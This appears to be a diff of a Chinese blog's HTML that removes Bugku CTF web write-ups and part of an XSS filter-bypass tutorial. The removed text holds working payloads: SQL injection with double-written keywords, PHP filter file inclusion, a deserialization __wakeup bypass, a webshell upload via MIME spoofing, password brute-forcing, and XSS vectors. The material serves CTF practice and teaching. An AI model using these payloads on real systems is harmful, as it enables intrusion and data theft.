-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; 回显空白 -&gt; 可能为单引号闭合</span><br><span class="line">?id=1&#x27;--+回显正常-&gt;单引号闭合方式</span><br><span class="line">?id=1&#x27; and 1=1--+ 回显空白 -&gt; 可能过滤了and</span><br><span class="line">?id=1&#x27;  And1=1--+回显空白-&gt;过滤了大小写</span><br><span class="line">?id=1&#x27; anandd 1=1--+ 回显正常 -&gt;   可以双写绕过   过滤了and、or</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>双写绕过，select=&gt;selselectect ,anandd,ununionion、注意information    包含or 也要双写</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">?id=-1&#x27; uniunionon selselectect 1,2,group_concat(schema_name)from infoorrmation_schema.schemata--+</span><br><span class="line">得到:information_schema,web18.</span><br><span class="line"></span><br><span class="line">爆表：</span><br><span class="line">?id=-1&#x27; uniunionon selselectect 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;web18&#x27;--+</span><br><span class="line">得到: ctf,flag.</span><br><span class="line"></span><br><span class="line">爆列：</span><br><span class="line">?id=-1&#x27; uniunionon selselectect 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;flag&#x27;--+</span><br><span class="line">得到：id,flag.</span><br><span class="line"></span><br><span class="line">爆字段：</span><br><span class="line">?id=-1&#x27; uniunionon selselectect 1,2,flag from flag--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="web19-待续…"><a href="#web19-待续…" class="headerlink" title="web19  待续…."></a>web19  待续….</h2><h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>进入之后 如提示下面 </p>
-<blockquote>
-<p>你的动态密文是：c148829bfef63940f828dfb909fb77193<br>GET提交对应的密文可以得到flag(form_input_name=’key’)<br>输出格式：’flag{….}’</p>
-</blockquote>
-<p>多次提交即可得到flag  搞不清在考察啥 下面下面是脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &#x27;http://123.206.31.85:10020/&#x27;</span><br><span class="line">s = requests.session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">res = r.text.encode(r.encoding).decode()</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">key = re.findall(r&#x27;[0-9a-z]+&#x27;, res)[0]</span><br><span class="line">url2 = url + &#x27;?key=&#x27; + key</span><br><span class="line">r2 = s.get(url2)</span><br><span class="line">res2 = r2.text.encode(r2.encoding).decode()</span><br><span class="line">print(res2)</span><br><span class="line">#多次提交没得到flag    看了wp才知道 在多试试</span><br><span class="line"></span><br><span class="line">改进</span><br><span class="line">#由于要多次提交，改了一下</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    url = &#x27;http://123.206.31.85:10020/&#x27;</span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.get(url)</span><br><span class="line">    res = r.text.encode(r.encoding).decode()</span><br><span class="line">    # print(res)</span><br><span class="line"></span><br><span class="line">    key = re.findall(r&#x27;[0-9a-z]+&#x27;, res)[0]</span><br><span class="line">    url2 = url + &#x27;?key=&#x27; + key</span><br><span class="line">    r2 = s.get(url2)</span><br><span class="line">    res2 = r2.text.encode(r2.encoding).decode()</span><br><span class="line">    if &quot;密文&quot; not in res2:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(res2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>进去提示  <code>you are not admin !</code></p>
-<p>查看网页源码 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">you are not admin !  </span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line"> </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#x27;r&#x27;)===&quot;admin&quot;))&#123;</span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">    include($file); //class.php</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>存在文件包含漏洞    读取class.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?user=php://input&amp;file=php://filter/read=convert.base64-encode/resource=class.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujblpajj313c0b5taj.jpg" alt="1557649488409"></p>
-<p>将其base64解码后  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"> </span><br><span class="line">class Read&#123;//f1a9.php</span><br><span class="line">    public $file;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        if(isset($this-&gt;file))&#123;</span><br><span class="line">            echo file_get_contents($this-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;__toString was called!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>php反序列化</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">构造序列化脚本</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">class Read&#123;//f1a9.php</span><br><span class="line">    public $file = &quot;f1a9.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">$a = new Read;</span><br><span class="line">echo serialize($a);</span><br><span class="line">//O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujblx7pj30re0l2ac9.jpg" alt="1556809809828"> </p>
-<h2 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h2><p>点击去啥也没有  </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.31.85:10022/hello.php?file=haha.php   </span><br><span class="line">http://123.206.31.85:10022/hello.php?file=php://filter/convert.base64-encode/resource=hello.php      读取haha.php空白，读取hello.php </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!--upload.php--&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    include $_GET[&#x27;file&#x27;];</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">然后后读取upload.php</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;/&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1&quot;&gt;</span><br><span class="line">    &lt;title&gt;UPLOAD&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;	</span><br><span class="line">&lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; name=&quot;upload&quot;&gt;</span><br><span class="line">file:</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if($_FILES[&#x27;file&#x27;][&#x27;type&#x27;] !== &quot;image/jpeg&quot;)  #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span><br><span class="line">        &#123;   </span><br><span class="line">         echo &quot;Sorry, we only allow uploading JPG images&quot;;</span><br><span class="line">         exit;</span><br><span class="line">         &#125;</span><br><span class="line"> $uploaddir = &#x27;upload/&#x27;;</span><br><span class="line"> $uploadfile = $uploaddir . basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line"> if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $uploadfile))</span><br><span class="line">     &#123;</span><br><span class="line">         echo &quot;File is valid, and was successfully uploaded.\n&quot;;</span><br><span class="line">         echo $uploadfile;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">             echo &quot;File uploading failed.\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">存在上传漏洞，可以绕过上传木马 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>访问upload.php  上传一个木马  抓包 修改文件类型   forward</p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbl5hij30by0740sz.jpg" alt="1557651819384"></p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbp7ooj30m60410sp.jpg" alt="1557651915833"></p>
-<p>上传成功 访问url/upload/fix.php 也就是你上传的大马</p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbt08kj308d05eaa0.jpg" alt="1557652223935"></p>
-<p>在网站根目录就可以看到(这个flag文件名似乎一直被人改，上次做的时候还是 flag.txt)</p>
-<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>开始没思路，我的御剑也没有扫到这么多，大佬指点，并且要了大佬的字典 。注意查看 </p>
-<p>在admin.php 进去就弹窗  在login.html  是登录的表单    robots提示有readme.txt   </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//readme.txt 里面有下面的提示 要将页面改为utf-8才可以看到，不然乱码</span><br><span class="line">网站默认登录用户名和密码为</span><br><span class="line">admin</span><br><span class="line">123</span><br><span class="line"></span><br><span class="line">用户登录后可自行修改密码</span><br><span class="line">密码只支持3位数字</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">你也想学php验证码啊</span><br><span class="line"></span><br><span class="line">http://123.206.31.85:10023/1.png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbt5jtj30ln07rwf1.jpg" alt="1557653629672"></p>
-<p>直接抓包用bp爆破  用户名admin 爆破密码   爆破出密码为667  然后即可查看flag</p>
-<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><p>查看源码 拉倒最底下 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Small_white_rabbit&#123;  </span><br><span class="line">    private $file = &#x27;index.php&#x27;;  </span><br><span class="line"></span><br><span class="line">    public function __construct($file) &#123;  </span><br><span class="line">        $this-&gt;file = $file;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;  </span><br><span class="line">        echo @highlight_file($this-&gt;file, true);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    function __wakeup() &#123;  </span><br><span class="line">        if ($this-&gt;file != &#x27;index.php&#x27;) &#123;  </span><br><span class="line">            //the secret is in the_f1ag.php  </span><br><span class="line">            $this-&gt;file = &#x27;index.php&#x27;;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;var&#x27;])) &#123;  </span><br><span class="line">    $var = base64_decode($_GET[&#x27;var&#x27;]);  </span><br><span class="line">    @unserialize($var);  </span><br><span class="line">&#125; else &#123;  </span><br><span class="line">    highlight_file(&quot;index.php&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>一个php的反序列化  要注意传入的值进行了base64解码，所以要将序列化后的结果base64加密，而且要绕过__wakeup() 这个函数，上面已经讲到如何绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Small_white_rabbit</span><br><span class="line">&#123;</span><br><span class="line">    private $file = &#x27;the_f1ag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$b=new Small_white_rabbit();</span><br><span class="line">$b=  serialize($b);</span><br><span class="line">$b=str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;,$b);</span><br><span class="line">$b=str_replace(&#x27;:1:&#x27;,&#x27;:2:&#x27;,$b);</span><br><span class="line">$b= base64_encode($b);</span><br><span class="line">echo $b;</span><br><span class="line">//TzoxODoiU21hbGxfd2hpdGVfcmFiYml0IjoyOntzOjI0OiIAU21hbGxfd2hpdGVfcmFiYml0AGZpbGUiO3M6MTI6InRoZV9mMWFnLnBocCI7fQ==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url?var=TzoxODoiU21hbGxfd2hpdGVfcmFiYml0IjoyOntzOjI0OiIAU21hbGxfd2hpdGVfcmFiYml0AGZpbGUiO3M6MTI6InRoZV9mMWFnLnBocCI7fQ==</span><br><span class="line">即可得到flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><p>进去后（真的是鬼知道这是啥）</p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbu76yj30cb04sq2v.jpg" alt="1557666848198"></p>
-<p>输入框下面有个链接，点进去，是个下载页面。但是下载不成功。修改下载路径为<code>http://123.206.31.85:10025/ziidan.txt</code> 拿着这个做字典用bp跑一下，没什么乱用。一度想爆破。扫网站路径扫到 <code>url/shell.php</code>  在用刚才的字典跑一下成功出flag。真的不知道出题人在考啥。无语……</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/09/11/new-bugku-writeup/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -479,177 +373,14 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
 <p>当这个代码被注入到输入框或是 url 参数的时候，会成功也可能会失败，如果失败了。也不意味着网站就是安全的。需要继续渗透。</p>
-<h2 id="XSS-绕过过滤"><a href="#XSS-绕过过滤" class="headerlink" title="XSS 绕过过滤"></a><code>XSS</code> 绕过过滤</h2><h4 id="转义-字符串"><a href="#转义-字符串" class="headerlink" title="转义 字符串"></a>转义 字符串</h4><p>第一步是查看当前的页面源代码，看看是不是包含了我们的这个测试的字符串，如果你发现了。你就会发<br>现很有意思。在一个输入<code>input</code>标签里。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INPUT type=&quot;text&quot; value=&#x27;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在这个例子，我们可以修改我们的输入来包含两个字符，来让代码跳出那对外围的单引号，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>现在我们的代码执行了。因为我们闭合了前面的 html 标签，就触发了 XSS，但是，你可能会发现，页面<br>上会显示一个多出来的单引号，为什么，因为后面的那个原来的单引号没有匹配，我们继续修改我们的代<br>码。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&lt;xss a=&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>所有的输入就会变成这样:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INPUT type=&quot;text&quot; value=&#x27;&#x27;&gt; &lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt; &lt;xss a=&#x27;&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Ok 了。<code>Javascript</code> 代码就注入了。<code>&lt;xss a=&quot;&gt;</code>这个没什么意义，你可以自己改，但是符合 html 的标准，<br>页面不会出错。</p>
-<h6 id="绕过单引号过滤继续！"><a href="#绕过单引号过滤继续！" class="headerlink" title="绕过单引号过滤继续！"></a>绕过单引号过滤继续！</h6><p>同样的例子，但是我们假设管理员在我们的单引号之前放置了一个<code>\</code>，有时候双引号之前也会放置，通<br>过一些类似 <code>add_slashes</code> 的函数可以实现，这个就是转义字符，我们先前的代码就会变成这样：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;INPUT type=&quot;text&quot; value=&#x27;\&#x27;&gt;&lt;SCRIPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCRIPT&gt;&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>有一些方法可以继续，但是要看过滤的那个函数是怎么放的了。其中一个方法就是使用<strong>字符实体</strong>，学过 html<br>的都知道，就是一些特殊字符会用一些固有的符号组合来表示，举个例子，你不能用&lt;&gt;表示大于和小于，<br>因为这被解释为 html 标签，但是，你如果要用，可以用下面的来代替。</p>
-<table>
-<thead>
-<tr>
-<th><code>&amp;#34;</code></th>
-<th><code>&amp;quot</code></th>
-<th align="left">“</th>
-<th>双引号</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>&amp;#38;</code></td>
-<td><code>&amp;amp;</code></td>
-<td align="left">&amp;</td>
-<td>&amp;符号</td>
-</tr>
-<tr>
-<td><code>&amp;#60;</code></td>
-<td><code>&amp;lt;</code></td>
-<td align="left">&lt;</td>
-<td>小于号</td>
-</tr>
-<tr>
-<td><code>&amp;#62;</code></td>
-<td><code>&amp;gt;</code></td>
-<td align="left">&gt;</td>
-<td>大于号</td>
-</tr>
-</tbody></table>
-<p>使用 <code>&amp;quot;</code>或者<code>&amp;#34;</code><br>来代替我们的双引号，有时候可以绕过过滤。<br>例子:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&amp;quot;XSS&amp;quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(&amp;#38;XSS&amp;#38;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果这都被过滤了。那我们可以使用 <code>JavaScript</code> 的 <code>fromCharCode</code> 函数，这个函数把指定的 Unicode<br>值转换成字符串。<br>比如:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</span><br><span class="line">&lt;INPUT type=&quot;text&quot; value=&#x27;\&#x27;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&#x27;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>你可以使用 <code>Mysql</code> 数据库的 <code>char</code>（字符，字符）来转换字符到字符码，大家可以使用自己喜欢的就行了。<br>转码的工具还是很多的。</p>
-<h4 id="绕过-lt-SCRIPT-gt-过滤"><a href="#绕过-lt-SCRIPT-gt-过滤" class="headerlink" title="绕过 &lt;SCRIPT&gt;   过滤"></a>绕过 <code>&lt;SCRIPT&gt; </code>  过滤</h4><p>有些过滤器会过滤到<code>&lt;script&gt;</code>标签，那上面的例子就都废了，但是。还是有方法插入 javascript 的。我<br>们看看事件处理器的例子。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;BODY onload=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="使用Onload-、onerror"><a href="#使用Onload-、onerror" class="headerlink" title="使用Onload 、onerror"></a>使用Onload 、onerror</h5><p>在 html 里啊。这个 <code>Onload</code> 关键字就是一个事件，其他的所有标签都没有这个属性，但是 <code>Body</code> 标签是<br>有的。但是，有一定的局限性，如果 <code>onload</code> 事件在你的代码之前已经被处理了。那就不会触发了。。不<br>过我们可以继续看看 <code>onerror</code> 事件处理。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;&quot; onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>注意看，图片没有指定，也就是出错了。<code>Onerror</code> 这个事件就会触发。引发 <code>XSS</code> 漏洞，没有用 <code>&lt;script&gt;</code><br>标签哦。</p>
-<h5 id="使用-IMG-源"><a href="#使用-IMG-源" class="headerlink" title="使用 IMG  源"></a>使用 IMG  源</h5><p>Html 中最常用的两个标签 <code>img</code> 和 a <code>href</code> 一般是不会过滤的，一个指定图片，一个指定超链接。最危险的<br>事 img 标签。<br>下面是一些例子:<br>标准的样子：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>没有双引号和分号:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>过滤了双引号和 <code>&lt;script&gt;:</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>使用 <code>CharCode</code> 绕过过滤:</p>
